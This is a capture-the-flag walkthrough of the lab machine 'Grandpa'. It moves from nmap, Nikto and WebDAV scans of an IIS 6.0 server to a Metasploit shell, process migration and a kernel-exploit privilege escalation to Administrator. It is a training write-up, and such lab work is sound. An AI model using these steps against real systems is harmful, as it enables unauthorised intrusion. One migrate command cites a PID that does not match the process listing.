# Grandpa

## Information Gathering
Grandpa<br>
10.10.10.14<br>

Software Versions
- MicrosoftOfficeWebServer 5.0_Pub
- Microsoft-IIS/6.0
- MS-FP/4.0,DAV

## Enumeration
Of course start with the nmap:
```bash
# Nmap 7.92 scan initiated Sun Feb 20 16:14:33 2022 as: nmap -sC -sV -oN nmap/grandpa.nmap -Pn 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up (0.031s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Sun, 20 Feb 2022 21:21:45 GMT
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 20 16:14:45 2022 -- 1 IP address (1 host up) scanned in 12.10 seconds

```
Since there is a webserver I run a Nikto scan
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.14
+ Target Port: 80
+ GET Retrieved microsoftofficewebserver header: 5.0_Pub
+ GET Retrieved x-powered-by header: ASP.NET
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved x-aspnet-version header: 1.1.4322
+ OPTIONS Retrieved dasl header: <DAV:sql>
+ OPTIONS Retrieved dav header: 1, 2
+ OPTIONS Retrieved ms-author-via header: MS-FP/4.0,DAV
+ OPTIONS Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: GET HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: GET HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: GET HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: GET HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: GET HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: GET HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS WebDAV enabled (COPY LOCK SEARCH UNLOCK MKCOL PROPPATCH PROPFIND listed as allowed)
+ OSVDB-13431: PROPFIND PROPFIND HTTP verb may show the servers internal IP address: http://10.10.10.14/
+ OSVDB-396: GET /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: GET /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: GET /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: GET /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. CVE-1999-1376. BID-2252.
+ OSVDB-67: POST /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ GET /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.

```
I also ran a DavTest because this webserver appears to be running WebDav:
```bash
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: XCfZ_8dkF
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     pl      FAIL
PUT     txt     FAIL
PUT     jsp     FAIL
PUT     php     FAIL
PUT     asp     FAIL
PUT     aspx    FAIL
PUT     jhtml   FAIL
PUT     cgi     FAIL
PUT     shtml   FAIL
PUT     cfm     FAIL
PUT     html    FAIL

********************************************************
/usr/bin/davtest Summary:
```
## Exploitation
Looking at the HTTP header, this server is running MS-FP/4.0DAV and Microsoft IIS 6.0. Doing a bit of searching reveals a CVE: https://www.exploit-db.com/exploits/41738<br> 
There is also a Metasploit module for this. Setting the options for Metasploit and running exploit pops a Metasploit shell. However, I do not have permissions to run getuid, probably because my user does not have permissions. This probably means I have to migrate to a different process. I read <a href="https://jlajara.gitlab.io/others/2018/11/26/process-migration.html">this</a> article about Metasploit migration since I've never done it before.
```
meterpreter> ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 584   392   svchost.exe
 668   392   svchost.exe
 736   392   svchost.exe
 768   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1064  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1312  392   VGAuthService.exe
 1380  392   vmtoolsd.exe
 1484  392   svchost.exe
 1588  392   svchost.exe
 1764  392   dllhost.exe
 1908  392   alg.exe
 1936  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2248  584   wmiprvse.exe
 2360  1484  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2432  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2480  2360  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe


```
I migrated to the wmiprvse.exe and get a suitable shell.
``` 
meterpreter > migrate 1935
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

## Privilege Escalation
Backgrounding the process and running the <b>mulit/recon/local_exploit_suggester</b>.
```
[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 38 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. 
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. 
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. 
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. 
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. 
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
The first exploit <b>exploit/windows/local/ms10_015_kitrap0d</b> got me an Administrator shell.
